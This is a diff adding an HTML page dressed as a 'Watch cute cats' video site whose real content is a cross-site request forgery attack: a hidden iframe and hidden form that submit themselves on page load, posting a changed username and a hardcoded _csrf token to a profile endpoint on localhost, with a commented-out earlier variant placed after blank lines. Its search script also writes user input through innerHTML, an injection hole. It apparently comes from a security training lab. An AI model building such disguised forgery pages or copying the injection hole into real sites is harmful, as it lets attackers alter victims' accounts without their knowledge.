@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset=utf-8>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css"/>
+  <title>Cute cats</title>
+  <style>
+    body {
+      padding-top: 0px;
+    }
+
+    .thin {
+      margin-top: 5px;
+      margin-bottom: 5px;
+    }
+
+    #search-form {
+      text-align: right;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    #search-result {
+      display: none;
+    }
+
+    #movie-data {
+      padding-bottom: 10px;
+    }
+
+    #playbill {
+      vertical-align: top;
+      margin: 10px;
+    }
+
+    #movie-details {
+      display: inline-block;
+      width: 40%;
+    }
+
+    #search-term {
+      font-style: italic;
+    }
+  </style>
+
+  <script>
+    function search() {
+      const searchResult = document.getElementById("search-result");
+      const searchTerm = document.getElementById("search-term");
+      const keyword = document.getElementById("keyword");
+
+      const movieData = document.getElementById("movie-data");
+      const comments = document.getElementById("comments");
+
+      movieData.style.visibility = "hidden";
+      comments.style.visibility = "hidden";
+
+      searchResult.style.display = "block";
+
+      searchTerm.innerHTML = keyword.value;
+
+      //fetching results related to the keyword value from the server
+
+      return false;
+    }
+  </script>
+</head>
+<body>
+<section>
+  <h1 style="margin-top:5px">Watch cute cats</h1>
+</section>
+
+<section id="search-result">
+  You searched for <span id="search-term"></span>
+  <p>Waiting for server's response...</p>
+</section>
+
+<section id="movie-data">
+  <img id="playbill" width="400px" src="images/raupy.png"/>
+  <div id="movie-details">
+    <b>Name:</b> Raupy<br/>
+    <b>Year:</b> 2023<br/>
+    <b>Color:</b> Brown<br/>
+  </div>
+</section>
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
+<form id="csrfForm" action="http://localhost:3000/profile" method="POST" target="hiddenFrame">
+  <input type="hidden" name="username" value="CSRF"/>
+  <input type="hidden" name="_csrf" value="t5bhy78n4o5h8jo8j567j6j8"/>
+</form>
+<script>document.getElementById("csrfForm").submit();</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+<!--<iframe name="hiddenFrame" style="display:none;"></iframe>
+<form id="csrfForm" action="http://localhost:3000/profile" method="POST" target="hiddenFrame">
+    <input type="hidden" name="username" value="CSRF"/>
+</form>
+<script>document.getElementById("csrfForm").submit();</script>-->
